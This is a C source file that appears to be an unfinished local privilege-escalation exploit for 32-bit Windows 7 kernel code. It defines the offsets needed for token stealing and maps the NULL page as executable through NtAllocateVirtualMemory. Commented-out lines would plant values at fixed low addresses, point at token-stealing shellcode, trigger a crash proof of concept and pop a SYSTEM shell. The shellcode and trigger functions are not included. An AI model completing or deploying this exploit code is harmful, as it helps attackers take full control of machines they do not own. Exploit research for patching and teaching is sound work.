#include <Windows.h>
#include <stdio.h>

#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")

#ifndef W32KAPI
#define W32KAPI  DECLSPEC_ADDRSAFE
#endif



#define KTHREAD_OFFSET    0x124    // nt!_KPCR.PcrbData.CurrentThread
#define EPROCESS_OFFSET   0x050    // nt!_KTHREAD.ApcState.Process
#define PID_OFFSET        0x0B4    // nt!_EPROCESS.UniqueProcessId
#define FLINK_OFFSET      0x0B8    // nt!_EPROCESS.ActiveProcessLinks.Flink
#define TOKEN_OFFSET      0x0F8    // nt!_EPROCESS.Token
#define SYSTEM_PID 0x004 // SYSTEM Process PID


typedef NTSTATUS WINAPI NtAllocateVirtualMemory_t(IN HANDLE     ProcessHandle,
    IN OUT PVOID  *BaseAddress,
    IN ULONG      ZeroBits,
    IN OUT PULONG AllocationSize,
    IN ULONG      AllocationType,
    IN ULONG Protect);


int main(int argc, char* argv[])
{
    HANDLE hProcess;
    DWORD dwPID = GetCurrentProcessId();
    DWORD Virtual_BaseAddr = 1;
    SIZE_T RegionSize = 0x1000;

    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, dwPID);
    NtAllocateVirtualMemory_t *NtAllocateVirtualMemory;
    NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t *)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtAllocateVirtualMemory");
    ULONG VirtualMemory_Result = NtAllocateVirtualMemory(hProcess,
        (LPVOID*)&Virtual_BaseAddr,
        0,
        &RegionSize,
        MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
        PAGE_EXECUTE_READWRITE);
    if (VirtualMemory_Result != 0x0)
        printf(" [!] Failed to allocate memory at BaseAddress, error: 0x%X\n", VirtualMemory_Result);
    else {
        printf(" [*] Allocated memory at BaseAddress");
    }
    memset(0x0, 0, 0x1000);

    // void* bypass_one = (void *)0x590;
    // *(LPBYTE)bypass_one = 0x1;
    // void* bypass_two = (void *)0x592;
    // *(LPBYTE)bypass_two = 0x1;
    // void* jump_addr = (void *)0x748;
    // *(LPDWORD)jump_addr = (DWORD)TokenStealingShellcodeWin7;
    // Trigger_BSoDPoc();
    // PopShell();
    return 0;
}